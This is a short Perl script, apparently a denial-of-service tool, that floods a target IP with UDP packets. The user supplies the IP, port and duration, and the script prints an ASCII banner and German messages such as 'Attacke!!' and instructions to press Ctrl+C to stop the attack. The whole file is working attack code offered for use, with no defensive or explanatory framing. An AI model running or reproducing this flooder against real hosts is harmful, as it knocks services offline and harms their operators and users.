#!/usr/bin/perl
use strict;
use warnings;
use Getopt::Long;
use Socket;
use Time::HiRes;


my $desenho = <<'ASCII';
    
ϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟ                                                       
ϟ_-_ _,,   ,,      ,      ,,                          ϟ
ϟ   -/  )  ||  '  ||      ||          '         _     ϟ
ϟ  ~||_<   || \\ =||= /\\ ||/\ ,._-_ \\  _-_   / \\   ϟ
ϟ   || \\  || ||  ||   /  ||_<  ||   || || \\ || ||   ϟ
ϟ   ,/--|| || ||  ||  /\\ || |  ||   || ||/   || ||   ϟ
ϟ  _--_-'  \\ \\  \\,  || \\,\  \\,  \\ \\,/  \\_-|   ϟ
ϟ (                    /                       /  \   ϟ
ϟ                     (,                      '----`  ϟ
ϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟ



ASCII


my $ip;
my $port;
my $time;


GetOptions(
    'ip=s' => \$ip,
    'port=i' => \$port,
    'time=i' => \$time,
);
print($desenho);
print('Attacke!!');

my ($iaddr, $endtime, $psize,$pport);

$iaddr = inet_aton("$ip") or die "Der Hostname konnte nicht aufgelöst werden. Bitte versuchen Sie es erneut $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

my $size = 700;

($size ? "$size-byte" : "") . " " . ($time ? "" : "") . "\033[1;32m\033[0m\n\n";
print "Drücken Sie STRG+C, um den Angriff zu stoppen";

for (; Time::HiRes::time() <= $endtime; ) {
    $psize = $size ? $size : int(rand(1024 - 64) + 64);
    $pport = $port ? $port : int(rand(65500)) + 1;

    send(flood, pack("a$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
}